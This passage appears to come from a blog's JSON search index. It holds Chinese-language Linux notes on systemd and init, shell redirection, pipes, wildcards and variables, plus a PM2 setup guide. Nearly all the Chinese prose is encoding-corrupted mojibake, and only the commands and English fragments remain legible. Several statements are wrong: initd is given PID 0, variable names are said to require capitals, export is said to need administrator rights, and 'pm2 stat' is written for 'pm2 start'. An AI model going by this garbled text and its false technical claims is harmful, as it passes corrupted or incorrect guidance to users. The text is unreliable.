çš„ä¸€ç§å®ç°æ–¹å¼ã€‚æ‰€ä»¥è¿™ä¸¤è€…å¯åŠ¨æ–¹å¼ï¼ˆæˆ–è€…æ˜¯åœæ­¢ã€é‡å¯ï¼‰å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ 123$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start&#x2F;&#x2F; ç­‰ä»·äº$ service nginx start ä½†æ˜¯è¿™ä¸¤ç§æ–¹å¼å‡æœ‰å¦‚ä¸‹ç¼ºç‚¹ï¼š å¯åŠ¨æ—¶é—´é•¿ã€‚init è¿›ç¨‹æ˜¯ä¸²è¡Œå¯åŠ¨ï¼Œåªæœ‰å‰ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨å®Œï¼Œæ‰ä¼šå¯åŠ¨ä¸‹ä¸€ä¸ªè¿›ç¨‹ã€‚ å¯åŠ¨è„šæœ¬å¤æ‚ã€‚initè¿›ç¨‹åªæ˜¯æ‰§è¡Œå¯åŠ¨è„šæœ¬ï¼Œä¸ç®¡å…¶ä»–äº‹æƒ…ã€‚è„šæœ¬éœ€è¦è‡ªå·±å¤„ç†å„ç§æƒ…å†µï¼Œè¿™å¾€å¾€ä½¿å¾—è„šæœ¬å˜å¾—å¾ˆé•¿ã€‚ systemdSystemd å°±æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜è€Œè¯ç”Ÿçš„ã€‚å®ƒåŒ…æ‹¬ System and Service Managerï¼Œä¸ºç³»ç»Ÿçš„å¯åŠ¨å’Œç®¡ç†æä¾›ä¸€å¥—å®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚Systemd æ˜¯Linux ç³»ç»Ÿä¸­æœ€æ–°çš„åˆå§‹åŒ–ç³»ç»Ÿï¼ˆinitï¼‰ï¼Œå®ƒä¸»è¦çš„è®¾è®¡ç›®çš„æ˜¯å…‹æœ System V initå›ºæœ‰çš„ç¼ºç‚¹ï¼Œæé«˜ç³»ç»Ÿçš„å¯åŠ¨é€Ÿåº¦ã€‚ æ ¹æ® Linux æƒ¯ä¾‹ï¼Œå­—æ¯dæ˜¯å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰çš„ç¼©å†™ã€‚ Systemd è¿™ä¸ªåå­—çš„å«ä¹‰ï¼Œå°±æ˜¯å®ƒè¦å®ˆæŠ¤æ•´ä¸ªç³»ç»Ÿã€‚ ä½¿ç”¨äº† Systemdï¼Œå°±ä¸éœ€è¦å†ç”¨init äº†ã€‚Systemd å–ä»£äº†initdï¼ˆInitd çš„PID æ˜¯0ï¼‰ ï¼Œæˆä¸ºç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼ˆSystemd çš„PID ç­‰äº 1ï¼‰ï¼Œå…¶ä»–è¿›ç¨‹éƒ½æ˜¯å®ƒçš„å­è¿›ç¨‹ã€‚ Systemd çš„ä¼˜ç‚¹æ˜¯åŠŸèƒ½å¼ºå¤§ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œç¼ºç‚¹æ˜¯ä½“ç³»åºå¤§ï¼Œéå¸¸å¤æ‚ã€‚ æŸ¥çœ‹Systemd çš„ç‰ˆæœ¬ä¿¡æ¯ 1$ systemctl --version ç³»ç»Ÿç®¡ç†Systemd å¹¶ä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œè€Œæ˜¯ä¸€ç»„å‘½ä»¤ï¼Œæ¶‰åŠåˆ°ç³»ç»Ÿç®¡ç†çš„æ–¹æ–¹é¢é¢ã€‚ systemctlsystemctlæ˜¯ Systemd çš„ä¸»å‘½ä»¤ï¼Œç”¨äºç®¡ç†ç³»ç»Ÿã€‚ 12345678&#x2F;&#x2F; é‡å¯ç³»ç»Ÿ$ sudo systemctl reboot&#x2F;&#x2F; å¯åŠ¨è¿›å…¥æ•‘æ´çŠ¶æ€ï¼ˆå•ç”¨æˆ·çŠ¶æ€ï¼‰$ sudo systemctl rescue&#x2F;&#x2F; ç®¡ç†æœåŠ¡$ sudo systemctl start nginx hostnamectlhostnamectlå‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰ä¸»æœºçš„ä¿¡æ¯ã€‚ 12345&#x2F;&#x2F; æ˜¾ç¤ºå½“å‰ä¸»æœºä¿¡æ¯$ hostnamectl&#x2F;&#x2F; è®¾ç½®ä¸»æœºå$ sudo hostnamectl set-hostname BoodeUbuntu localectllocalectlå‘½ä»¤ç”¨äºæŸ¥çœ‹æœ¬åœ°åŒ–è®¾ç½®ã€‚ 123456&#x2F;&#x2F; æŸ¥çœ‹æœ¬åœ°åŒ–è®¾ç½®$ localectl&#x2F;&#x2F; è®¾ç½®æœ¬åœ°åŒ–å‚æ•°ã€‚$ sudo localectl set-locale LANG&#x3D;en_GB.utf8$ sudo localectl set-keymap en_GB timedatectltimedatectlå‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰æ—¶åŒºè®¾ç½®ã€‚ 12345678910&#x2F;&#x2F; æŸ¥çœ‹å½“å‰æ—¶åŒºè®¾ç½®$ timedatectl&#x2F;&#x2F; æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨çš„æ—¶åŒº$ timedatectl list-timezones &#x2F;&#x2F; è®¾ç½®å½“å‰æ—¶åŒº$ sudo timedatectl set-timezone America&#x2F;New_York$ sudo timedatectl set-time YYYY-MM-DD$ sudo timedatectl set-time HH:MM:SS æ€»ç»“ init æ˜¯æœ€åˆçš„è¿›ç¨‹ç®¡ç†æ–¹å¼ service æ˜¯init çš„å¦ä¸€ç§å®ç° systemd åˆ™æ˜¯ä¸€ç§å–ä»£ initd çš„è§£å†³æ–¹æ¡ˆ å…¶ä¸­ systemctl æ˜¯ systemd çš„ä¸»å‘½ä»¤ï¼Œç”¨äºç®¡ç†ç³»ç»Ÿä»¥åŠæœåŠ¡ã€‚ å‚è€ƒé“¾æ¥ Linux Init - ç»´åŸºç™¾ç§‘ Systemd å…¥é—¨æ•™ç¨‹ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿— initã€serviceã€systemctl çš„åŒºåˆ« Linux å®ˆæŠ¤è¿›ç¨‹çš„å¯åŠ¨æ–¹å¼","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"äº†è§£ Linuxçš„ç®¡é“ç¬¦ã€é‡å®šå‘ã€ç¯å¢ƒå˜é‡","slug":"understand-linux-pipe-symbols-redirects-environment-variables","date":"2020-07-13T15:48:12.000Z","updated":"2020-07-14T15:49:18.916Z","comments":true,"path":"understand-linux-pipe-symbols-redirects-environment-variables/","link":"","permalink":"https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/","excerpt":"è¿™ç¯‡æ–‡ç« æµ…è°ˆä¸€ä¸‹ Linux çš„ç®¡é“ç¬¦ã€é‡å®šå‘å’Œç¯å¢ƒå˜é‡ã€‚","text":"è¿™ç¯‡æ–‡ç« æµ…è°ˆä¸€ä¸‹ Linux çš„ç®¡é“ç¬¦ã€é‡å®šå‘å’Œç¯å¢ƒå˜é‡ã€‚ è¾“å…¥è¾“å‡ºé‡å®šå‘åœ¨äº†è§£ä»€ä¹ˆæ˜¯è¾“å…¥è¾“å‡ºé‡å®šå‘ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¦ææ¸…æ¥šä»¥ä¸‹ä¸¤ç§è¾“å‡ºä¿¡æ¯çš„åŒºåˆ«ï¼š æ ‡å‡†è¾“å‡ºä¿¡æ¯ï¼šåŒ…æ‹¬è¯¥æ–‡ä»¶çš„ä¸€äº›ç›¸å…³æƒé™ã€æ‰€æœ‰è€…ã€æ‰€å±ç»„ã€æ–‡ä»¶å¤§å°åŠä¿®æ”¹æ—¶é—´ç­‰ä¿¡æ¯ã€‚ é”™è¯¯è¾“å‡ºä¿¡æ¯ï¼šBashç»ˆç«¯æ˜¾ç¤ºçš„æŠ¥é”™æç¤ºä¿¡æ¯123456[max@localhost æ¡Œé¢]$ lstestdir test.txt[max@localhost æ¡Œé¢]$ cat test.txtHello Linux! # æ ‡å‡†è¾“å‡ºä¿¡æ¯[max@localhost æ¡Œé¢]$ cat xxxcat: xxx: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• # é”™è¯¯è¾“å‡ºä¿¡æ¯ å› ä¸ºä¸å­˜åœ¨xxxæ–‡ä»¶ æ ‡å‡†è¾“å…¥é‡å®šå‘ï¼ˆSTDINï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸º0ï¼‰ï¼šé»˜è®¤ä»é”®ç›˜è¾“å…¥ï¼Œä¹Ÿå¯ä»å…¶ä»–æ–‡ä»¶æˆ–å‘½ä»¤ä¸­è¾“å…¥ã€‚ æ ‡å‡†è¾“å‡ºé‡å®šå‘ï¼ˆSTDOUTï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸º1ï¼‰ï¼šé»˜è®¤è¾“å‡ºåˆ°å±å¹•ã€‚ é”™è¯¯è¾“å‡ºé‡å®šå‘ï¼ˆSTDERRï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸º2ï¼‰ï¼šé»˜è®¤è¾“å‡ºåˆ°å±å¹•ã€‚ ä¹‹æ‰€ä»¥èŠ±è¿™ä¹ˆå¤§åŠ›æ°”ï¼Œç†è§£è¿™ä¸ªæ¦‚å¿µï¼Œæ˜¯å› ä¸ºå¾…ä¼šæœ‰ä¸ªå¾ˆé‡è¦çš„çŸ¥è¯†ç‚¹è¦ç”¨åˆ°è¿™ä¸ªæ¦‚å¿µã€‚ è¾“å‡ºé‡å®šå‘123456å‘½ä»¤ &gt; æ–‡ä»¶ å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆæ¸…ç©ºåŸæœ‰æ–‡ä»¶çš„æ•°æ®ï¼‰å‘½ä»¤ 2&gt; æ–‡ä»¶ å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆæ¸…ç©ºåŸæœ‰æ–‡ä»¶çš„æ•°æ®ï¼‰å‘½ä»¤ &gt;&gt; æ–‡ä»¶ å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰å‘½ä»¤ 2&gt;&gt; æ–‡ä»¶ å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰å‘½ä»¤ &gt;&gt; æ–‡ä»¶ 2&gt;&amp;1 æˆ–å‘½ä»¤ &amp;&gt;&gt; æ–‡ä»¶ å°†æ ‡å‡†è¾“å‡ºä¸é”™è¯¯è¾“å‡ºå…±åŒå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰ å®ä¾‹ï¼š 12345678910[max@localhost æ¡Œé¢]$ cat test.txtHello Linux![max@localhost æ¡Œé¢]$ echo &quot;æµ‹è¯•è¾“å‡ºé‡å®šå‘(è¿½åŠ æ¨¡å¼)&quot; &gt;&gt; test.txt[max@localhost æ¡Œé¢]$ cat test.txt Hello Linux!æµ‹è¯•è¾“å‡ºé‡å®šå‘(è¿½åŠ æ¨¡å¼)[max@localhost æ¡Œé¢]$ echo &quot;æµ‹è¯•è¾“å‡ºé‡å®šå‘(æ¸…é™¤æ¨¡å¼)&quot; &gt; test.txt[max@localhost æ¡Œé¢]$ cat test.txtæµ‹è¯•è¾“å‡ºé‡å®šå‘(æ¸…é™¤æ¨¡å¼) è¾“å…¥é‡å®šå‘123å‘½ä»¤ &lt; æ–‡ä»¶ å°†æ–‡ä»¶ä½œä¸ºå‘½ä»¤çš„æ ‡å‡†è¾“å…¥å‘½ä»¤ &lt;&lt; åˆ†ç•Œç¬¦ ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å…¥ï¼Œç›´åˆ°é‡è§åˆ†ç•Œç¬¦æ‰åœæ­¢å‘½ä»¤ &lt; æ–‡ä»¶1 &gt; æ–‡ä»¶2 å°†æ–‡ä»¶1ä½œä¸ºå‘½ä»¤çš„æ ‡å‡†è¾“å…¥å¹¶å°†æ ‡å‡†è¾“å‡ºåˆ°æ–‡ä»¶2 è¾“å…¥é‡å®šå‘ç›¸å¯¹äºè¾“å‡ºé‡å®šå‘è¾ƒä½¿ç”¨çš„å°‘ä¸€äº›ï¼Œå¯ä»¥ç†è§£ä¸ºï¼šè¾“å…¥é‡å®šå‘çš„ä½œç”¨æ˜¯æŠŠæ–‡ä»¶ç›´æ¥å¯¼å…¥åˆ°å‘½ä»¤ä¸­ã€‚ä¾‹å­ï¼š 123# å°†æ–‡ä»¶text.txtå¯¼å…¥ç»™ &#96;wc -l&#96;å‘½ä»¤ï¼Œç»Ÿè®¡è¡Œæ•°ã€‚[max@localhost æ¡Œé¢]$ wc -l &lt; test.txt1 ç®¡é“ç¬¦ç®¡é“ç¬¦çš„æ¦‚å¿µå°±æ˜¯ï¼šæŠŠå‰ä¸€ä¸ªå‘½ä»¤åŸæœ¬è¦è¾“å‡ºåˆ°å±å¹•çš„æ ‡å‡†æ­£å¸¸æ•°æ®å½“ä½œæ˜¯åä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚ ä¸¾ä¸ªä¾‹å­ï¼ŒæŠŠetcç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶çš„å±æ€§ä¿¡æ¯ï¼Œä½œä¸ºæ ‡å‡†è¾“å…¥ä¼ é€’ç»™ moreå‘½ä»¤ã€‚ 12345678[max@localhost æ¡Œé¢]$ ls -l &#x2F;etc&#x2F; | moreæ€»ç”¨é‡ 1396drwxr-xr-x. 3 root root 97 8æœˆ 24 04:35 abrt-rw-r--r--. 1 root root 16 8æœˆ 24 04:43 adjtime-rw-r--r--. 1 root root 21929 1æœˆ 29 2014 brltty.confdrwxr-xr-x. 2 root root 6 1æœˆ 29 2014 chkconfig.d-rw-r--r--. 1 root root 1157 2æœˆ 6 2014 chrony.conf--More-- å‘½ä»¤è¡Œä¸­çš„é€šé…ç¬¦ æ˜Ÿå·ï¼ˆ*ï¼‰ä»£è¡¨åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ é—®å·ï¼ˆ?ï¼‰ä»£è¡¨åŒ¹é…å•ä¸ªå­—ç¬¦ ä¸­æ‹¬å·å†…åŠ ä¸Šæ•°å­—[0-9]ä»£è¡¨åŒ¹é…0ï½9ä¹‹é—´çš„å•ä¸ªæ•°å­—çš„å­—ç¬¦ è€Œä¸­æ‹¬å·å†…åŠ ä¸Šå­—æ¯[abc]åˆ™æ˜¯ä»£è¡¨åŒ¹é…aã€bã€cä¸‰ä¸ªå­—ç¬¦ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦123456789101112131415161718[max@localhost test]$ lsfile1 file2 file3 file99 filex[max@localhost test]$ ls -l file?-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file1-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file2-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file3-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 filex[max@localhost test]$ ls -l file*-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file1-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file2-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file3-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file99-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 filex[max@localhost test]$ ls -l file[1-2]-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file1-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file2[max@localhost test]$ ls -l file[x]-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 filex å¸¸ç”¨çš„è½¬ä¹‰å­—ç¬¦ åæ–œæ ï¼ˆ\\ï¼‰ï¼šä½¿åæ–œæ åé¢çš„ä¸€ä¸ªå˜é‡å˜ä¸ºå•çº¯çš„å­—ç¬¦ä¸²ã€‚ å•å¼•å·ï¼ˆâ€™â€™ï¼‰ï¼šè½¬ä¹‰å…¶ä¸­æ‰€æœ‰çš„å˜é‡ä¸ºå•çº¯çš„å­—ç¬¦ä¸²ã€‚ åŒå¼•å·ï¼ˆâ€â€ï¼‰ï¼šä¿ç•™å…¶ä¸­çš„å˜é‡å±æ€§ï¼Œä¸è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚ åå¼•å·ï¼ˆ``ï¼‰ï¼šæŠŠå…¶ä¸­çš„å‘½ä»¤æ‰§è¡Œåè¿”å›ç»“æœã€‚ 123[max@localhost test]$ PRICE&#x3D;5[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;The price of this shirt is 5 ä¸Šé¢çš„è¾“å‡ºçœ‹ä¸Šå»æŒºå¯¹çš„ï¼Œä½†æ˜¯å¹¶ä¸å®Œç¾ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿè¾“å‡ºâ€œThe price of this shirt is $5â€ï¼Œäºæ˜¯æˆ‘ä»¬è¯•ç€è¿™æ ·å†™ï¼š 12[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;The price of this shirt is 9944PRICE ä¸å¹¸çš„æ˜¯ç¾å…ƒç¬¦å·å’Œå˜é‡æå–ç¬¦å·åˆå¹¶å$$ä½œç”¨æ˜¯æ˜¾ç¤ºå½“å‰ç¨‹åºçš„è¿›ç¨‹IDã€‚ è¦æƒ³è®©ç¬¬ä¸€ä¸ª$ä¹–ä¹–åœ°ä½œä¸ºç¾å…ƒç¬¦å·ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åæ–œæ \\æ¥è¿›è¡Œè½¬ä¹‰ï¼Œå°†è¿™ä¸ªå‘½ä»¤æå–ç¬¦è½¬ä¹‰æˆå•çº¯çš„æ–‡æœ¬ï¼Œå»é™¤å…¶ç‰¹æ®ŠåŠŸèƒ½ã€‚ 12[max@localhost test]$ echo &quot;The price of this shirt is \\$$PRICE&quot;The price of this shirt is $5 å¦‚æœåªéœ€è¦æŸä¸ªå‘½ä»¤çš„è¾“å‡ºå€¼æ—¶ï¼Œå¯ä»¥åƒå‘½ä»¤è¿™æ ·ï¼Œå°†å‘½ä»¤ç”¨åå¼•å·æ‹¬èµ·æ¥ï¼Œè¾¾åˆ°é¢„æœŸçš„æ•ˆæœ. 123[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1[max@localhost test]$ cat file1Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux æ€è€ƒï¼šå¦‚ä½•å°†æ™®é€šå˜é‡è½¬æ¢ä¸ºå…¨å±€å˜é‡ï¼Ÿ ä½¿ç”¨å‘½ä»¤ï¼šexport [å˜é‡åç§°]ï¼Œéœ€è¦åœ¨æ‹¥æœ‰ç®¡ç†å‘˜æƒé™æ—¶æ‰èƒ½æ­£å¸¸ä½¿ç”¨ã€‚ 12345678910111213141516[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir[root@localhost home]# mkdir $WORKDIR [root@localhost home]# cd $WORKDIR[root@localhost workdir]# pwd&#x2F;home&#x2F;workdir[root@localhost workdir]# exitexit[max@localhost home]$ cd $WORKDIR[max@localhost ~]$ echo $WORKDIR[max@localhost ~]$ su rootå¯†ç ï¼š[root@localhost max]# export WORKDIR[root@localhost &#x2F;]# su max[max@localhost &#x2F;]$ cd $WORKDIR[max@localhost workdir]$ pwd&#x2F;home&#x2F;workdir é‡ç‚¹ä¸€ï¼šåœ¨ä¸Šé¢çš„å‘½ä»¤ä¸­æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„çŸ¥è¯†ç‚¹ï¼š å…³äºå¦‚ä½•åœ¨Linuxä¸­åˆ›å»ºä¸€ä¸ªå˜é‡çš„é—®é¢˜ï¼Ÿæœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚ æ‰€æœ‰å­—æ¯éƒ½éœ€è¦å¤§å†™ å˜é‡ä¸èµ‹å€¼ç¬¦å·(=)ä¹‹é—´ä¸èƒ½å­˜åœ¨ç©ºæ ¼ æ— è®ºæ˜¯ç³»ç»Ÿç¯å¢ƒå˜é‡è¿˜æ˜¯è‡ªå®šä¹‰å˜é‡è¿˜æ˜¯å…¨å±€å˜é‡ï¼Œåœ¨è°ƒç”¨æ—¶ éƒ½éœ€è¦ä½¿ç”¨$ç¬¦å·æ¥æ ‡è¯†ã€‚ é‡ç‚¹äºŒ åœ¨Linux ç³»ç»Ÿä¸­å½“æ™®é€šç”¨æˆ·èº«ä»½æ—¶å‘½ä»¤æç¤ºç¬¦çš„å‰ç¼€æ ‡è¯†æ˜¯ï¼š$ã€‚ åœ¨Linux ç³»ç»Ÿä¸­å½“ä¸ºç®¡ç†å‘˜èº«ä»½æ—¶å‘½ä»¤æç¤ºç¬¦çš„å‰ç¼€æ ‡è¯†æ˜¯ï¼š#ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"PM2 å¿«é€Ÿä¸Šæ‰‹","slug":"pm2-quick-start","date":"2020-07-12T13:44:47.000Z","updated":"2020-09-04T13:54:47.036Z","comments":true,"path":"pm2-quick-start/","link":"","permalink":"https://www.0x2beace.com/pm2-quick-start/","excerpt":"PM2 æ˜¯Node.js ç”Ÿäº§ç¯å¢ƒä¸­çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œè‡ªå¸¦è´Ÿè½½å‡è¡¡åŠŸèƒ½ã€‚","text":"PM2 æ˜¯Node.js ç”Ÿäº§ç¯å¢ƒä¸­çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œè‡ªå¸¦è´Ÿè½½å‡è¡¡åŠŸèƒ½ã€‚ å®‰è£… 1$ npm install pm2 -g æ— ç¼æ›´æ–° 1$ pm2 update å¯åŠ¨åº”ç”¨PM2 ä¸­æœ‰ä¸¤ç§æ–¹å¼å¯åŠ¨åº”ç”¨ï¼Œä¸€ç§æ˜¯ç›´æ¥è°ƒç”¨åº”ç”¨å…¥å£æ–‡ä»¶ï¼Œä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨é…ç½®æ–‡ä»¶å¯åŠ¨åº”ç”¨ã€‚ å‘½ä»¤è¡Œå¯åŠ¨åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œé€šè¿‡å‘½ä»¤è¡Œå¯åŠ¨æœåŠ¡ 1$ pm2 stat app.js é…ç½®æ–‡ä»¶å¯åŠ¨å¾ˆå¤šæ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨ PM2 å»å¯åŠ¨åº”ç”¨ï¼Œå¯èƒ½ä¸èƒ½å®Œå…¨æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ å½“éœ€è¦å¯¹åº”ç”¨æœ‰æ›´å¤šçš„è¦æ±‚æ—¶ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°PM2 çš„é…ç½®æ–‡ä»¶äº†ã€‚ PM2 æ”¯æŒé€šè¿‡é…ç½®æ–‡ä»¶åˆ›å»ºç®¡ç†åº”ç”¨ï¼Œé¦–å…ˆåœ¨é¡¹ç›®æ ¹ç›®å½•æ‰‹åŠ¨åˆ›å»ºé…ç½®æ–‡ä»¶precesses.jsonï¼š 12345678910&#123; &quot;apps&quot;: [ &#123; &quot;name&quot;: &quot;myApp&quot;, &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;, &quot;script&quot;: &quot;.&#x2F;app.js&quot;, &quot;watch&quot;: true &#125; ]&#125; æˆ–è€…ç›´æ¥ä½¿ç”¨ pm2 init å‘½ä»¤ï¼Œè‡ªåŠ¨åˆ›å»ºé»˜è®¤çš„ecosystem.config.jsé…ç½®æ–‡ä»¶ï¼š 1234567module.exports &#x3D; &#123; apps : [&#123; name: &quot;myApp&quot;, script: &#39;index.js&#39;, watch: &#39;.&#39; &#125;&#125;; è¿™ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥åˆ›å»ºç®¡ç†åº”ç”¨ï¼Œä½œç”¨éƒ½æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åªæ˜¯ï¼šä¸€ä¸ªæ˜¯jsonæ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯jsæ ¼å¼çš„é…ç½®æ–‡ä»¶ã€‚ ä¸Šé¢æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„processes.jsoné…ç½®ï¼Œåˆ›å»ºäº†ä¸€ä¸ªmyAppåº”ç”¨ï¼Œå¦‚æœä½ æœ‰å¤šä¸ªæœåŠ¡ï¼Œé‚£ä¹ˆapps è¿™ä¸ªæ•°ç»„ä¸­åˆ›å»ºå¤šä¸ªåº”ç”¨ã€‚ åˆ›å»ºå¥½é…ç½®æ–‡ä»¶ä¹‹åï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•å¯åŠ¨å‘¢ï¼Ÿ æœ‰ä¸¤ç§æ–¹å¼ï¼š ç›´æ¥è°ƒç”¨é…ç½®æ–‡ä»¶å¯åŠ¨ 1$ pm2 start processes.json å¯ä»¥å¢åŠ --envå‚æ•°ï¼Œæ¥æŒ‡å®šå½“å‰å¯åŠ¨ç¯å¢ƒã€‚ é€šè¿‡package.json é…ç½®æ–‡ä»¶ï¼Œé…ç½®è„šæœ¬å¯åŠ¨ 123456&#x2F;&#x2F; package.json&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;node server&#x2F;index&quot;, &quot;pm2&quot;: &quot;pm2 start processes.json&quot; &#125; ç„¶åå°±å¯ä»¥ç›´æ¥ä½¿ç”¨npm start pm2 æ¥å¯åŠ¨åº”ç”¨äº†ã€‚ å‚æ•°è¯´æ˜åœ¨é…ç½®æ–‡ä»¶ä½ å¯ä»¥æŒ‡å®šç¯å¢ƒå˜é‡ã€æ—¥å¿—æ–‡ä»¶ã€è¿›ç¨‹æ–‡ä»¶ï¼Œé‡å¯æœ€å¤§æ¬¡æ•°â€¦ç­‰é…ç½®é¡¹ã€‚æ”¯æŒJSONå’ŒYAMLæ ¼å¼ã€‚ PM2 çš„é…ç½®æ”¯æŒéå¸¸å¤šçš„å‚æ•°ï¼Œä¸‹é¢ä¼šå¯¹å¸¸ç”¨çš„å‚æ•°ä¸€ä¸€åšè¯´æ˜ã€‚ å­—æ®µ ç±»å‹ å€¼ æè¿° name string myApp åº”ç”¨çš„åå­—ï¼Œé»˜è®¤æ˜¯è„šæœ¬æ–‡ä»¶å cwd string /var/www/myApp åº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½• script string ./server.js åº”ç”¨ç¨‹åºçš„è„šæœ¬è·¯å¾„ï¼Œç›¸å¯¹äºåº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½• log_date_format string YYYY-MM-DD HH:mm Z æ—¥å¿—æ—¶é—´æ ¼å¼ error_file string - é”™è¯¯æ—¥å¿—å­˜æ”¾è·¯å¾„ out_file string - è¾“å‡ºæ—¥å¿—å­˜æ”¾è·¯å¾„ pid_file string - pidæ–‡ä»¶è·¯å¾„ watch boolean or array true å½“ç›®å½•æ–‡ä»¶æˆ–å­ç›®å½•æ–‡ä»¶æœ‰å˜åŒ–æ—¶è‡ªåŠ¨é‡æ–°åŠ è½½åº”ç”¨ ignore_watch list [â€[/]./â€, â€œnode_modulesâ€] listä¸­çš„æ­£åˆ™åŒ¹é…çš„æ–‡ä»¶å’Œç›®å½•æœ‰å˜åŒ–æ—¶ä¸é‡æ–°åŠ è½½åº”ç”¨ max_memory_restart string 50M å½“åº”ç”¨è¶…è¿‡è®¾å®šçš„å†…å­˜å¤§å°å°±è‡ªåŠ¨é‡å¯ min_uptime string 60s æœ€å°è¿è¡Œæ—¶é—´ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯60så³å¦‚æœåº”ç”¨ç¨‹åºåœ¨60så†…é€€å‡ºï¼Œpm2ä¼šè®¤ä¸ºç¨‹åºå¼‚å¸¸é€€å‡ºï¼Œæ­¤æ—¶è§¦å‘é‡å¯max_restartsè®¾ç½®æ•°é‡ max_restarts number 10 è®¾ç½®åº”ç”¨ç¨‹åºå¼‚å¸¸é€€å‡ºé‡å¯çš„æ¬¡æ•°ï¼Œé»˜è®¤15æ¬¡ï¼ˆä»0å¼€å§‹è®¡æ•°ï¼‰ instances number 1 å¯åŠ¨å®ä¾‹ä¸ªæ•° cron_restart string 1 0 * * * å®šæ—¶é‡å¯ exec_interpreter string node 